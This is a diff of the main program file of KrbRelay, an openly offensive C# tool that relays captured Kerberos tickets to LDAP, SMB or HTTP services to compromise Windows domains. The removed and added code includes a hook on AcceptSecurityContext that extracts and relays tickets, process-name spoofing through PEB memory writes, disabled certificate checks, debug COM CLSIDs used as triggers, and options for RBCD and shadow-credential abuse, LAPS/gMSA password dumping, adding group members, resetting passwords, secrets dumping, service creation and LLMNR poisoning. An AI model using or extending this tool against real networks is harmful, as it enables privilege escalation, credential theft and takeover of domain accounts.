@@ -1,202 +1,24 @@
-﻿using KrbRelay.Clients;
-using KrbRelay.Com;
-using NetFwTypeLib;
+﻿using KrbRelay.Com;
 using SMBLibrary;
 using SMBLibrary.Client;
 using System;
 using System.Collections.Generic;
-using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Http;
-using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
-using static KrbRelay.Natives;
 
 namespace KrbRelay
 {
     internal class Program
     {
-        public static string SetProcessModuleName(string s)
-        {
-            IntPtr hProcess = GetCurrentProcess();
-            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
-            UInt32 RetLen = 0;
-            IntPtr temp;
-            NtQueryInformationProcess(hProcess, 0, ref pbi, Marshal.SizeOf(pbi), ref RetLen);
-
-            //https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-rtl_user_process_parameters
-            IntPtr pProcessParametersOffset = (IntPtr)(pbi.PebBaseAddress + 0x20);
-            byte[] addrBuf = new byte[IntPtr.Size];
-            ReadProcessMemory(hProcess, pProcessParametersOffset, addrBuf, addrBuf.Length, out temp);
-            IntPtr processParametersOffset = (IntPtr)BitConverter.ToInt64(addrBuf, 0);
-            IntPtr imagePathNameOffset = processParametersOffset + 0x060;
-            //Console.WriteLine("processParametersOffset: 0x{0:X}", processParametersOffset.ToInt64());
-            //Console.WriteLine("imagePathNameOffset: 0x{0:X}", imagePathNameOffset.ToInt64());
-
-            //read imagePathName
-            byte[] addrBuf2 = new byte[Marshal.SizeOf(typeof(UNICODE_STRING))];
-            ReadProcessMemory(hProcess, imagePathNameOffset, addrBuf2, addrBuf2.Length, out temp);
-            UNICODE_STRING str = Helpers.ReadStruct<UNICODE_STRING>(addrBuf2);
-            byte[] addrBuf3 = new byte[str.Length];
-            ReadProcessMemory(hProcess, str.Buffer, addrBuf3, addrBuf3.Length, out temp);
-            string oldName = Encoding.Unicode.GetString(addrBuf3);
-
-            //write imagePathName
-            byte[] b = Encoding.Unicode.GetBytes(s + "\x00");
-            WriteProcessMemory(hProcess, str.Buffer, b, b.Length, out temp);
-
-            CloseHandle(hProcess);
-            return oldName;
-        }
-
-        public static void setUserData(int SessionId)
-        {
-            if (SessionId != -123)
-            {
-                uint bytesReturned;
-                bool worked;
-                IntPtr buffer = IntPtr.Zero;
-
-                try { 
-                    worked = WTSQuerySessionInformation(IntPtr.Zero, SessionId, WTS_INFO_CLASS.ConnectState, out buffer, out bytesReturned);
-                    var state = (WTS_CONNECTSTATE_CLASS)Enum.ToObject(typeof(WTS_CONNECTSTATE_CLASS), Marshal.ReadInt32(buffer));
-                    if (state != WTS_CONNECTSTATE_CLASS.Active)
-                        Console.WriteLine("[-] WARNING, user's session is not active");
-                }
-                catch
-                {
-                    Console.WriteLine("[-] Session {0} does not exists", SessionId);
-                    Environment.Exit(0);
-                }
-
-                worked = WTSQuerySessionInformation(IntPtr.Zero, SessionId, WTS_INFO_CLASS.DomainName, out buffer, out bytesReturned);
-                relayedUserDomain = Marshal.PtrToStringAnsi(buffer);
-
-                worked = WTSQuerySessionInformation(IntPtr.Zero, SessionId, WTS_INFO_CLASS.UserName, out buffer, out bytesReturned);
-                relayedUser = Marshal.PtrToStringAnsi(buffer);
-            }
-            else
-            {
-                relayedUser = Environment.MachineName + "$";
-                relayedUserDomain = domainDN.Replace(",", ".").Replace("DC=", "");
-            }
-            Console.WriteLine("[*] Relaying context: {0}\\{1}", relayedUserDomain, relayedUser);
-        }
-
-        
-        public static SECURITY_HANDLE ldap_phCredential = new SECURITY_HANDLE();
-        public static IntPtr ld = IntPtr.Zero;
-        public static byte[] apRep1 = new byte[] { };
-        public static byte[] apRep2 = new byte[] { };
-        public static byte[] ticket = new byte[] { };
-        public static string spn = "";
-        public static string relayedUser = "";
-        public static string relayedUserDomain = "";
-        public static string domainDN = "";
-        public static string targetFQDN = "";
-        public static bool useSSL = false;
-        public static bool stopSpoofing = false;
-        public static Dictionary<string, string> attacks = new Dictionary<string, string>();
         public static SMB2Client smbClient = new SMB2Client();
         public static HttpClientHandler handler = new HttpClientHandler();
         public static HttpClient httpClient = new HttpClient();
         public static CookieContainer CookieContainer = new CookieContainer();
-
-        //hooked function
-        [STAThread]
-        public static SecStatusCode AcceptSecurityContext_(
-            [In] SecHandle phCredential,
-            [In] SecHandle phContext,
-            [In] SecurityBufferDescriptor pInput,
-            AcceptContextReqFlags fContextReq,
-            SecDataRep TargetDataRep,
-            [In, Out] SecHandle phNewContext,
-            [In, Out] IntPtr pOutput,
-            out AcceptContextRetFlags pfContextAttr,
-            [Out] SECURITY_INTEGER ptsExpiry)
-        {
-            //get kerberos tickets sent to our com server
-            if (apRep1.Length == 0)
-            {
-                //ap_req
-                ticket = pInput.ToByteArray().Take(pInput.ToByteArray().Length - 32).ToArray();
-                int ticketOffset = Helpers.PatternAt(ticket, new byte[] { 0x6e, 0x82 }); // 0x6e, 0x82, 0x06
-                ticket = ticket.Skip(ticketOffset).ToArray();
-                ticket = Helpers.ConvertApReq(ticket);
-                if(ticket[0] != 0x60)
-                {
-                    Console.WriteLine("[-] Recieved invalid apReq, exploit will fail");
-                    Console.WriteLine("{0}", Helpers.ByteArrayToString(ticket));
-                    Environment.Exit(0);
-                }
-                else
-                {
-                    Console.WriteLine("[*] apReq: {0}", Helpers.ByteArrayToString(ticket));
-                }
-            }
-            else
-            {
-                apRep2 = pInput.ToByteArray().Take(pInput.ToByteArray().Length - 32).ToArray();
-                int apRep2Offset = Helpers.PatternAt(apRep2, new byte[] { 0x6f }, true);
-                apRep2 = apRep2.Skip(apRep2Offset).ToArray();
-                ticket = apRep2;
-                Console.WriteLine("[*] apRep2: {0}", Helpers.ByteArrayToString(ticket));
-            }
-
-            string service = spn.Split('/').First();
-            if (service.ToLower() == "ldap")
-            {
-                Ldap.Connect();
-            }
-            else if (service.ToLower() == "http")
-            {
-                Http.Connect();
-            }
-            else if (service.ToLower() == "cifs")
-            {
-                Smb.Connect();
-            }
-
-            //overwrite security buffer
-            var pOutput2 = new SecurityBufferDescriptor(12288);
-            //var buffer = new SecurityBufferDescriptor(msgidbytes);
-            var buffer = new SecurityBuffer(apRep1);
-            int size = Marshal.SizeOf(buffer);
-            int size2 = apRep1.Length;
-            var BufferPtr = Marshal.AllocHGlobal(size);
-            Marshal.StructureToPtr(buffer, BufferPtr, false);
-            byte[] BufferBytes = new byte[size];
-            Marshal.Copy(BufferPtr, BufferBytes, 0, size);
-            var ogSecDesc = (SecurityBufferDescriptor)Marshal.PtrToStructure(pOutput, typeof(SecurityBufferDescriptor));
-            var ogSecBuffer = (SecurityBuffer)Marshal.PtrToStructure(ogSecDesc.BufferPtr, typeof(SecurityBuffer));
-
-            SecStatusCode ret = AcceptSecurityContext(
-                phCredential,
-                phContext,
-                pInput,
-                fContextReq,
-                TargetDataRep,
-                phNewContext,
-                pOutput2,
-                out pfContextAttr,
-                ptsExpiry);
-
-            //overwrite SecurityBuffer bytes
-            if (apRep2.Length == 0)
-            {
-                byte[] nbytes = new byte[254];
-                Marshal.Copy(apRep1, 0, ogSecBuffer.Token + 116, apRep1.Length); // verify this 116 offset?
-                Marshal.Copy(nbytes, 0, (IntPtr)ogSecBuffer.Token + apRep1.Length + 116, nbytes.Length);
-            }
-
-            Console.WriteLine("[*] AcceptSecurityContext: {0}", ret);
-            Console.WriteLine("[*] fContextReq: {0}", fContextReq);
-
-            return ret;
-        }
 
         private static void ShowHelp()
         {
@@ -208,8 +30,12 @@ namespace KrbRelay
             Console.WriteLine("Usage: KrbRelay.exe -spn <SPN> [OPTIONS] [ATTACK]");
             Console.WriteLine("LDAP attacks:");
             Console.WriteLine("-console                         Interactive LDAP console");
-            Console.WriteLine("-rbcd <SID> <OPTIONAL TARGET>    Configure RBCD for a given SID (default target localhost)");
-            Console.WriteLine("-shadowcred <OPTIONAL TARGET>    Configure msDS-KeyCredentialLink (default target localhost)");
+            Console.WriteLine(
+                "-rbcd <SID> <OPTIONAL TARGET>    Configure RBCD for a given SID (default target localhost)"
+            );
+            Console.WriteLine(
+                "-shadowcred <OPTIONAL TARGET>    Configure msDS-KeyCredentialLink (default target localhost)"
+            );
             Console.WriteLine("-laps <OPTIONAL TARGET>          Dump LAPS passwords");
             Console.WriteLine("-gMSA <OPTIONAL TARGET>          Dump gMSA passwords");
             Console.WriteLine("-add-groupmember <GROUP> <USER>  Add user to group");
@@ -232,7 +58,9 @@ namespace KrbRelay
 
             Console.WriteLine("HTTP attacks:");
             Console.WriteLine("-endpoint <ENDPOINT>             Example; 'EWS/Exchange.asmx'");
-            Console.WriteLine("-proxy                           Start a HTTP proxy server against target");
+            Console.WriteLine(
+                "-proxy                           Start a HTTP proxy server against target"
+            );
             //Console.WriteLine("-adcs <TEMPLATE>                 Generate certificate");
             //Console.WriteLine("-ews-console                   EWS console");
             Console.WriteLine("-ews-delegate <USER@DOMAIN>      EWS delegate mailbox");
@@ -249,36 +77,7 @@ namespace KrbRelay
             Console.WriteLine("-llmnr                    LLMNR poisoning");
         }
 
-        public static bool checkPort(int port, string name = "SYSTEM")
-        {
-            INetFwMgr mgr = (INetFwMgr)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FwMgr"));
-            if (!mgr.LocalPolicy.CurrentProfile.FirewallEnabled)
-            {
-                return true;
-            }
-            mgr.IsPortAllowed(name, NET_FW_IP_VERSION_.NET_FW_IP_VERSION_ANY, port, "", NET_FW_IP_PROTOCOL_.NET_FW_IP_PROTOCOL_TCP, out object allowed, out object restricted);
-            return (bool)allowed;
-        }
-
-        public static int checkPorts(string[] names)
-        {
-            IPGlobalProperties ipGlobalProperties = IPGlobalProperties.GetIPGlobalProperties();
-            IPEndPoint[] tcpConnInfoArray = ipGlobalProperties.GetActiveTcpListeners();
-            List<int> tcpPorts = tcpConnInfoArray.Select(i => i.Port).ToList();
-
-            foreach (string name in names)
-            {
-                for (int i = 1; i < 65535; i++)
-                {
-                    if (checkPort(i, name) && !tcpPorts.Contains(i))
-                    {
-                        return i;
-                    }
-                }
-            }
-            return -1;
-        }
-
+        [STAThread]
         public static void Main(string[] args)
         {
             string clsid = "";
@@ -303,11 +102,11 @@ namespace KrbRelay
                         {
                             if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                 throw new Exception();
-                            attacks.Add("console", args[entry.index + 1]);
+                            State.attacks.Add("console", args[entry.index + 1]);
                         }
                         catch
                         {
-                            attacks.Add("console", "");
+                            State.attacks.Add("console", "");
                         }
                         break;
                     // ldap attacks
@@ -315,17 +114,26 @@ namespace KrbRelay
                     case "/RBCD":
                         try
                         {
-                            if (args[entry.index + 2].StartsWith("/") || args[entry.index + 2].StartsWith("-"))
+                            if (
+                                args[entry.index + 2].StartsWith("/")
+                                || args[entry.index + 2].StartsWith("-")
+                            )
                                 throw new Exception();
-                            attacks.Add("rbcd", args[entry.index + 1] + " " + args[entry.index + 2]);
+                            State.attacks.Add(
+                                "rbcd",
+                                args[entry.index + 1] + " " + args[entry.index + 2]
+                            );
                         }
                         catch
                         {
                             try
                             {
-                                if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
+                                if (
+                                    args[entry.index + 1].StartsWith("/")
+                                    || args[entry.index + 1].StartsWith("-")
+                                )
                                     throw new Exception();
-                                attacks.Add("rbcd", args[entry.index + 1] + " " + "");
+                                State.attacks.Add("rbcd", args[entry.index + 1] + " " + "");
                             }
                             catch
                             {
@@ -339,13 +147,16 @@ namespace KrbRelay
                     case "/SHADOWCRED":
                         try
                         {
-                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
+                            if (
+                                args[entry.index + 1].StartsWith("/")
+                                || args[entry.index + 1].StartsWith("-")
+                            )
                                 throw new Exception();
-                            attacks.Add("shadowcred", args[entry.index + 1]);
+                            State.attacks.Add("shadowcred", args[entry.index + 1]);
                         }
                         catch
                         {
-                            attacks.Add("shadowcred", "");
+                            State.attacks.Add("shadowcred", "");
                         }
                         break;
 
@@ -353,13 +164,16 @@ namespace KrbRelay
                     case "/LAPS":
                         try
                         {
-                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
+                            if (
+                                args[entry.index + 1].StartsWith("/")
+                                || args[entry.index + 1].StartsWith("-")
+                            )
                                 throw new Exception();
-                            attacks.Add("laps", args[entry.index + 1]);
+                            State.attacks.Add("laps", args[entry.index + 1]);
                         }
                         catch
                         {
-                            attacks.Add("laps", "");
+                            State.attacks.Add("laps", "");
                         }
                         break;
 
@@ -367,13 +181,16 @@ namespace KrbRelay
                     case "/GMSA":
                         try
                         {
-                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
+                            if (
+                                args[entry.index + 1].StartsWith("/")
+                                || args[entry.index + 1].StartsWith("-")
+                            )
                                 throw new Exception();
-                            attacks.Add("gmsa", args[entry.index + 1]);
+                            State.attacks.Add("gmsa", args[entry.index + 1]);
                         }
                         catch
                         {
-                            attacks.Add("gmsa", "");
+                            State.attacks.Add("gmsa", "");
                         }
                         break;
 
@@ -381,11 +198,20 @@ namespace KrbRelay
                     case "/ADD-GROUPMEMBER":
                         try
                         {
-                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
+                            if (
+                                args[entry.index + 1].StartsWith("/")
+                                || args[entry.index + 1].StartsWith("-")
+                            )
                                 throw new Exception();
-                            if (args[entry.index + 2].StartsWith("/") || args[entry.index + 2].StartsWith("-"))
+                            if (
+                                args[entry.index + 2].StartsWith("/")
+                                || args[entry.index + 2].StartsWith("-")
+                            )
                                 throw new Exception();
-                            attacks.Add("add-groupmember", args[entry.index + 1] + " " + args[entry.index + 2]);
+                            State.attacks.Add(
+                                "add-groupmember",
+                                args[entry.index + 1] + " " + args[entry.index + 2]
+                            );
                         }
                         catch
                         {
@@ -398,9 +224,15 @@ namespace KrbRelay
                     case "/RESET-PASSWORD":
                         try
                         {
-                            if (args[entry.index + 2].StartsWith("/") || args[entry.index + 2].StartsWith("-"))
+                            if (
+                                args[entry.index + 2].StartsWith("/")
+                                || args[entry.index + 2].StartsWith("-")
+                            )
                                 throw new Exception();
-                            attacks.Add("reset-password", args[entry.index + 1] + " " + args[entry.index + 2]);
+                            State.attacks.Add(
+                                "reset-password",
+                                args[entry.index + 1] + " " + args[entry.index + 2]
+                            );
                         }
                         catch
                         {
@@ -414,13 +246,16 @@ namespace KrbRelay
                     case "/LIST":
                         try
                         {
-                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
+                            if (
+                                args[entry.index + 1].StartsWith("/")
+                                || args[entry.index + 1].StartsWith("-")
+                            )
                                 throw new Exception();
-                            attacks.Add("list", args[entry.index + 1]);
+                            State.attacks.Add("list", args[entry.index + 1]);
                         }
                         catch
                         {
-                            attacks.Add("list", "");
+                            State.attacks.Add("list", "");
                         }
                         break;
 
@@ -428,9 +263,12 @@ namespace KrbRelay
                     case "/UPLOAD":
                         try
                         {
-                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
+                            if (
+                                args[entry.index + 1].StartsWith("/")
+                                || args[entry.index + 1].StartsWith("-")
+                            )
                                 throw new Exception();
-                            attacks.Add("upload", args[entry.index + 1]);
+                            State.attacks.Add("upload", args[entry.index + 1]);
                         }
                         catch
                         {
@@ -443,9 +281,12 @@ namespace KrbRelay
                     case "/DOWNLOAD":
                         try
                         {
-                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
+                            if (
+                                args[entry.index + 1].StartsWith("/")
+                                || args[entry.index + 1].StartsWith("-")
+                            )
                                 throw new Exception();
-                            attacks.Add("download", args[entry.index + 1]);
+                            State.attacks.Add("download", args[entry.index + 1]);
                         }
                         catch
                         {
@@ -458,13 +299,16 @@ namespace KrbRelay
                     case "/SECRETS":
                         try
                         {
-                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
+                            if (
+                                args[entry.index + 1].StartsWith("/")
+                                || args[entry.index + 1].StartsWith("-")
+                            )
                                 throw new Exception();
-                            attacks.Add("secrets", args[entry.index + 1]);
+                            State.attacks.Add("secrets", args[entry.index + 1]);
                         }
                         catch
                         {
-                            attacks.Add("secrets", "");
+                            State.attacks.Add("secrets", "");
                         }
                         break;
 
@@ -472,7 +316,7 @@ namespace KrbRelay
                     case "/ADD-PRIVILEGES":
                         try
                         {
-                            attacks.Add("add-privileges", args[entry.index + 1]);
+                            State.attacks.Add("add-privileges", args[entry.index + 1]);
                         }
                         catch
                         {
@@ -485,11 +329,20 @@ namespace KrbRelay
                     case "/SERVICE-ADD":
                         try
                         {
-                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
+                            if (
+                                args[entry.index + 1].StartsWith("/")
+                                || args[entry.index + 1].StartsWith("-")
+                            )
                                 throw new Exception();
-                            if (args[entry.index + 2].StartsWith("/") || args[entry.index + 2].StartsWith("-"))
+                            if (
+                                args[entry.index + 2].StartsWith("/")
+                                || args[entry.index + 2].StartsWith("-")
+                            )
                                 throw new Exception();
-                            attacks.Add("service-add", args[entry.index + 1] + " " + args[entry.index + 2]);
+                            State.attacks.Add(
+                                "service-add",
+                                args[entry.index + 1] + " " + args[entry.index + 2]
+                            );
                         }
                         catch
                         {
@@ -502,7 +355,7 @@ namespace KrbRelay
                     case "/ADD-PRINTERDRIVER":
                         try
                         {
-                            attacks.Add("add-priverdriver", args[entry.index + 1]);
+                            State.attacks.Add("add-priverdriver", args[entry.index + 1]);
                         }
                         catch
                         {
@@ -516,9 +369,12 @@ namespace KrbRelay
                     case "/ENDPOINT":
                         try
                         {
-                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
+                            if (
+                                args[entry.index + 1].StartsWith("/")
+                                || args[entry.index + 1].StartsWith("-")
+                            )
                                 throw new Exception();
-                            attacks.Add("endpoint", args[entry.index + 1]);
+                            State.attacks.Add("endpoint", args[entry.index + 1]);
                         }
                         catch
                         {
@@ -531,9 +387,12 @@ namespace KrbRelay
                     case "/ADCS":
                         try
                         {
-                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
+                            if (
+                                args[entry.index + 1].StartsWith("/")
+                                || args[entry.index + 1].StartsWith("-")
+                            )
                                 throw new Exception();
-                            attacks.Add("adcs", args[entry.index + 1]);
+                            State.attacks.Add("adcs", args[entry.index + 1]);
                         }
                         catch
                         {
@@ -546,13 +405,16 @@ namespace KrbRelay
                     case "/PROXY":
                         try
                         {
-                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
+                            if (
+                                args[entry.index + 1].StartsWith("/")
+                                || args[entry.index + 1].StartsWith("-")
+                            )
                                 throw new Exception();
-                            attacks.Add("proxy", args[entry.index + 1]);
+                            State.attacks.Add("proxy", args[entry.index + 1]);
                         }
                         catch
                         {
-                            attacks.Add("proxy", "");
+                            State.attacks.Add("proxy", "");
                         }
                         break;
 
@@ -560,13 +422,16 @@ namespace KrbRelay
                     case "/EWS-CONSOLE":
                         try
                         {
-                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
+                            if (
+                                args[entry.index + 1].StartsWith("/")
+                                || args[entry.index + 1].StartsWith("-")
+                            )
                                 throw new Exception();
-                            attacks.Add("ews-console", args[entry.index + 1]);
+                            State.attacks.Add("ews-console", args[entry.index + 1]);
                         }
                         catch
                         {
-                            attacks.Add("ews-console", "");
+                            State.attacks.Add("ews-console", "");
                         }
                         break;
 
@@ -574,9 +439,12 @@ namespace KrbRelay
                     case "/EWS-DELEGATE":
                         try
                         {
-                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
+                            if (
+                                args[entry.index + 1].StartsWith("/")
+                                || args[entry.index + 1].StartsWith("-")
+                            )
                                 throw new Exception();
-                            attacks.Add("ews-delegate", args[entry.index + 1]);
+                            State.attacks.Add("ews-delegate", args[entry.index + 1]);
                         }
                         catch
                         {
@@ -589,9 +457,12 @@ namespace KrbRelay
                     case "/EWS-SEARCH":
                         try
                         {
-                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
+                            if (
+                                args[entry.index + 1].StartsWith("/")
+                                || args[entry.index + 1].StartsWith("-")
+                            )
                                 throw new Exception();
-                            attacks.Add("ews-search", args[entry.index + 1]);
+                            State.attacks.Add("ews-search", args[entry.index + 1]);
                         }
                         catch
                         {
@@ -608,7 +479,7 @@ namespace KrbRelay
 
                     case "-SSL":
                     case "/SSL":
-                        useSSL = true;
+                        State.useSSL = true;
                         break;
                     case "-LLMNR":
                     case "/LLMNR":
@@ -622,7 +493,7 @@ namespace KrbRelay
 
                     case "-SPN":
                     case "/SPN":
-                        spn = args[entry.index + 1];
+                        State.spn = args[entry.index + 1];
                         break;
 
                     case "-CLSID":
@@ -643,32 +514,33 @@ namespace KrbRelay
                 return;
             }
 
-            if (string.IsNullOrEmpty(spn))
+            if (string.IsNullOrEmpty(State.spn))
             {
                 Console.WriteLine("Missing /spn: parameter");
                 Console.WriteLine("KrbRelay.exe -h for help");
                 return;
             }
 
-
             if (string.IsNullOrEmpty(domain))
             {
-                string[] d = spn.Split('.').Skip(1).ToArray();
+                string[] d = State.spn.Split('.').Skip(1).ToArray();
                 domain = string.Join(".", d);
             }
-            if (string.IsNullOrEmpty(targetFQDN))
+
+            if (string.IsNullOrEmpty(State.targetFQDN))
             {
-                string[] d = spn.Split('/').Skip(1).ToArray();
-                targetFQDN = string.Join(".", d);
+                string[] d = State.spn.Split('/').Skip(1).ToArray();
+                State.targetFQDN = string.Join(".", d);
             }
+
             var domainComponent = domain.Split('.');
             foreach (string dc in domainComponent)
             {
-                domainDN += string.Concat(",DC=", dc);
+                State.domainDN += string.Concat(",DC=", dc);
             }
-            domainDN = domainDN.TrimStart(',');
+            State.domainDN = State.domainDN.TrimStart(',');
 
-            service = spn.Split('/').First().ToLower();
+            service = State.spn.Split('/').First().ToLower();
             if (!(new List<string> { "ldap", "cifs", "http" }.Contains(service)))
             {
                 Console.WriteLine("'{0}' service not supported", service);
@@ -676,36 +548,45 @@ namespace KrbRelay
                 return;
             }
 
+            if (State.attacks.ContainsKey("gmsa") && !State.useSSL)
+            {
+                Console.WriteLine("Getting gMSA passwords requires SSL (-ssl)", service);
+                return;
+            }
+
             if (string.IsNullOrEmpty(clsid) && llmnr == false)
             {
+#if DEBUG
+                // Hard overrides for testing
+                if (sessionID != -123)
+                {
+                    // cross-session
+                    //clsid = "{354ff91b-5e49-4bdc-a8e6-1cb6c6877182}";
+                    //clsid = "{38e441fb-3d16-422f-8750-b2dacec5cefc}";
+                    clsid = "{f8842f8e-dafe-4b37-9d38-4e0714a61149}";
+                }
+                else
+                {
+                    //system
+                    clsid = "{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}";
+                }
+
+                Console.WriteLine("[*] Manually set CLSID for debug mode");
+#else
                 Console.WriteLine("Missing /clsid: parameter");
                 Console.WriteLine("KrbRelay.exe -h for help");
                 return;
-
-                // for dev
-                //if (sessionID != -123)
-                //{
-                //    // cross-session
-                //    //clsid = "{354ff91b-5e49-4bdc-a8e6-1cb6c6877182}";
-                //    //clsid = "{38e441fb-3d16-422f-8750-b2dacec5cefc}";
-                //    clsid = "{f8842f8e-dafe-4b37-9d38-4e0714a61149}";
-                //}
-                //else
-                //{
-                //    //system
-                //    clsid = "{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}";
-                //}
+#endif
             }
             if (!string.IsNullOrEmpty(clsid))
                 clsId_guid = new Guid(clsid);
 
-            //
-            setUserData(sessionID);
+            Helpers.GetWtsSessionData(sessionID);
 
             if (service == "ldap")
             {
-                var ldap_ptsExpiry = new SECURITY_INTEGER();
-                var status = AcquireCredentialsHandle(
+                var expiration = new LARGE_INTEGER();
+                var status = Interop.AcquireCredentialsHandle(
                     null,
                     "Negotiate",
                     2,
@@ -713,96 +594,109 @@ namespace KrbRelay
                     IntPtr.Zero,
                     IntPtr.Zero,
                     IntPtr.Zero,
-                    ref ldap_phCredential,
-                    IntPtr.Zero);
-                //Console.WriteLine("[*] AcquireCredentialsHandle:  {0}", (SecStatusCode)status);
+                    ref State.ldap_CredHandle,
+                    ref expiration
+                );
+
+#if DEBUG
+                Console.WriteLine("[*] AcquireCredentialsHandle: {0}", status);
+#endif
 
                 var timeout = new LDAP_TIMEVAL
                 {
                     tv_sec = (int)(new TimeSpan(0, 0, 60).Ticks / TimeSpan.TicksPerSecond)
                 };
-                if (useSSL)
+                if (State.useSSL)
                 {
-                    //ld = Ldap.ldap_sslinit(targetFQDN, 636, 1);
-                    ld = ldap_init(targetFQDN, 636);
+                    State.ld = Interop.ldap_init(State.targetFQDN, 636);
                 }
                 else
                 {
-                    ld = ldap_init(targetFQDN, 389);
+                    State.ld = Interop.ldap_init(State.targetFQDN, 389);
                 }
 
                 uint LDAP_OPT_ON = 1;
                 uint LDAP_OPT_OFF = 1;
                 uint version = 3;
-                var ldapStatus = ldap_set_option(ld, 0x11, ref version);
+                var ldapStatus = Interop.ldap_set_option(State.ld, 0x11, ref version);
 
-                if (useSSL)
+                if (State.useSSL)
                 {
-                    ldap_get_option(ld, 0x0a, out int lv);  //LDAP_OPT_SSL
+                    Interop.ldap_get_option(State.ld, 0x0a, out int lv); //LDAP_OPT_SSL
                     if (lv == 0)
-                        ldap_set_option(ld, 0x0a, ref LDAP_OPT_ON);
+                        Interop.ldap_set_option(State.ld, 0x0a, ref LDAP_OPT_ON);
 
-                    ldap_get_option(ld, 0x0095, out lv);  //LDAP_OPT_SIGN
+                    Interop.ldap_get_option(State.ld, 0x0095, out lv); //LDAP_OPT_SIGN
                     if (lv == 0)
-                        ldap_set_option(ld, 0x0095, ref LDAP_OPT_ON);
+                        Interop.ldap_set_option(State.ld, 0x0095, ref LDAP_OPT_ON);
 
-                    ldap_get_option(ld, 0x0096, out lv);  //LDAP_OPT_ENCRYPT
+                    Interop.ldap_get_option(State.ld, 0x0096, out lv); //LDAP_OPT_ENCRYPT
                     if (lv == 0)
-                        ldap_set_option(ld, 0x0096, ref LDAP_OPT_ON);
-                    
-                    Helpers.TrustAllCertificates(ld);
+                        Interop.ldap_set_option(State.ld, 0x0096, ref LDAP_OPT_ON);
+
+                    Helpers.TrustAllCertificates(State.ld);
                 }
 
-                ldapStatus = ldap_connect(ld, timeout);
+                ldapStatus = Interop.ldap_connect(State.ld, timeout);
                 if (ldapStatus != 0)
                 {
-                    Console.WriteLine("[-] Could not connect to {0}. ldap_connect failed with error code 0x{1}", targetFQDN, ldapStatus.ToString("x2"));
+                    Console.WriteLine("[-] Could not connect to {0}, ldap_connect failed with error code 0x{1:X2}", State.targetFQDN, ldapStatus);
                     return;
                 }
             }
             if (service == "cifs")
             {
-                bool isConnected = smbClient.Connect(targetFQDN, SMBTransportType.DirectTCPTransport);
+                bool isConnected = smbClient.Connect(
+                    State.targetFQDN,
+                    SMBTransportType.DirectTCPTransport
+                );
                 if (!isConnected)
                 {
-                    Console.WriteLine("[-] Could not connect to {0}:445", targetFQDN);
+                    Console.WriteLine("[-] Could not connect to {0}:445", State.targetFQDN);
                     return;
                 }
             }
             if (service == "http")
             {
-                if (!attacks.Keys.Contains("endpoint") || string.IsNullOrEmpty(attacks["endpoint"]))
+                if (
+                    !State.attacks.Keys.Contains("endpoint")
+                    || string.IsNullOrEmpty(State.attacks["endpoint"])
+                )
                 {
                     Console.WriteLine("[-] -endpoint parameter is required for HTTP");
                     return;
                 }
-                //handler = new HttpClientHandler() { PreAuthenticate = false, UseCookies = false };
-                ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
-                handler = new HttpClientHandler() { UseDefaultCredentials = false, PreAuthenticate = false, UseCookies = true };
-                //handler.AutomaticDecompression = DecompressionMethods.Deflate | DecompressionMethods.GZip;
-                //handler.ClientCertificateOptions = ClientCertificateOption.Manual;
-                //handler.AllowAutoRedirect = true;
-                //handler.Proxy = new WebProxy("http://localhost:8080");
 
-                //handler.ServerCertificateCustomValidationCallback =
-                //    (httpRequestMessage, cert, cetChain, policyErrors) =>
-                //    {
-                //        return true;
-                //    };
+                ServicePointManager.ServerCertificateValidationCallback += (
+                    sender,
+                    certificate,
+                    chain,
+                    sslPolicyErrors
+                ) => true;
+                handler = new HttpClientHandler()
+                {
+                    UseDefaultCredentials = false,
+                    PreAuthenticate = false,
+                    UseCookies = true
+                };
                 httpClient = new HttpClient(handler) { Timeout = new TimeSpan(0, 0, 10) };
                 string transport = "http";
-                if (useSSL)
+                if (State.useSSL)
                 {
                     transport = "https";
                 }
-                httpClient.BaseAddress = new Uri(string.Format("{0}://{1}", transport, targetFQDN));
-                //Console.WriteLine(httpClient.BaseAddress);
-            }
+                httpClient.BaseAddress = new Uri(
+                    string.Format("{0}://{1}", transport, State.targetFQDN)
+                );
 
+#if DEBUG
+                Console.WriteLine("[*] HTTP base address: {0}", httpClient.BaseAddress);
+#endif
+            }
 
             if (llmnr)
             {
-                if(service == "ldap")
+                if (service == "ldap")
                 {
                     Console.WriteLine("[-] LLMNR will not work with ldap");
                     return;
@@ -812,8 +706,28 @@ namespace KrbRelay
                 string argSpooferIP = "";
                 string argSpooferIPv6 = "";
 
-                if (!String.IsNullOrEmpty(argSpooferIP)) { try { IPAddress.Parse(argSpooferIP); } catch { throw new ArgumentException("SpooferIP value must be an IP address"); } }
-                if (!String.IsNullOrEmpty(argSpooferIPv6)) { try { IPAddress.Parse(argSpooferIPv6); } catch { throw new ArgumentException("SpooferIP value must be an IP address"); } }
